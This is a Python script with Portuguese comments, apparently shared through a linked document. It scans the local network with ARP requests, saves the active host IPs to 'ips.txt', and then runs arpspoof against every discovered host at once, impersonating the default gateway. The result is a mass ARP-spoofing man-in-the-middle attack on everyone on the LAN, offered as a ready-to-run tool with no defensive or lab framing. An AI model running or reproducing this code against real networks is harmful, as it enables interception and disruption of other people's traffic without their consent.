https://docs.google.com/document/d/1OOqY4KuTFqOFsgJlSk5tdCqwYFr3cLgx0luJPuU_3Tk/edit?usp=sharing





======================================================
from scapy.all import ARP, Ether, srp, conf
import ipaddress
import netifaces
import subprocess
import signal
import sys


def get_active_interface():
    """Retorna a interface de rede ativa do sistema."""
    return conf.iface.name


def get_interface_info(iface):
    """Retorna informações da interface: IP, rede, broadcast e gateway."""
    addrs = netifaces.ifaddresses(iface)

    if netifaces.AF_INET not in addrs:
        raise Exception("Interface não possui IPv4.")

    ip_info = addrs[netifaces.AF_INET][0]
    ip = ip_info['addr']
    netmask = ip_info['netmask']

    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)

    gateways = netifaces.gateways()
    gateway_ip = None
    if 'default' in gateways and netifaces.AF_INET in gateways['default']:
        gateway_ip = gateways['default'][netifaces.AF_INET][0]

    return {
        "ip": ip,
        "network": network,
        "broadcast": str(network.broadcast_address),
        "gateway": gateway_ip
    }


def scan_network(network, iface):
    """Escaneia a rede local e retorna hosts ativos."""
    print(f"Escaneando rede: {network} na interface {iface}...")

    arp_request = ARP(pdst=str(network))
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request

    result = srp(packet, timeout=3, verbose=0, iface=iface)[0]

    active_hosts = [received.psrc for sent, received in result]
    return active_hosts


def save_ips(ips, filename="ips.txt"):
    """Salva os IPs ativos em um arquivo."""
    with open(filename, "w") as f:
        for ip in ips:
            f.write(ip + "\n")
    print(f"{len(ips)} hosts ativos salvos em {filename}")


def arp_spoof(hosts, interface, gateway):
    """Inicia ARP spoofing em todos os hosts simultaneamente."""
    processes = []

    # Inicia arpspoof para cada host
    for ip in hosts:
        p = subprocess.Popen(['arpspoof', '-i', interface, '-t', ip, gateway])
        processes.append(p)

    print("ARP spoofing iniciado em todos os hosts. Pressione CTRL+C para parar.")

    try:
        # Mantém o script rodando enquanto os processos estão ativos
        for p in processes:
            p.wait()
    except KeyboardInterrupt:
        print("\nInterrompido pelo usuário. Encerrando todos os processos...")
        for p in processes:
            p.terminate()
        sys.exit(0)


def main():
    iface = get_active_interface()
    info = get_interface_info(iface)

    hosts = scan_network(info["network"], iface)

    # Filtra IP local, gateway e broadcast
    filtered_hosts = [
        ip for ip in hosts
        if ip not in {info["ip"], info["gateway"], info["broadcast"]}
    ]

    save_ips(filtered_hosts)

    if filtered_hosts and info["gateway"]:
        arp_spoof(filtered_hosts, iface, info["gateway"])
    else:
        print("Nenhum host válido encontrado ou gateway não disponível.")


if __name__ == "__main__":
    main()
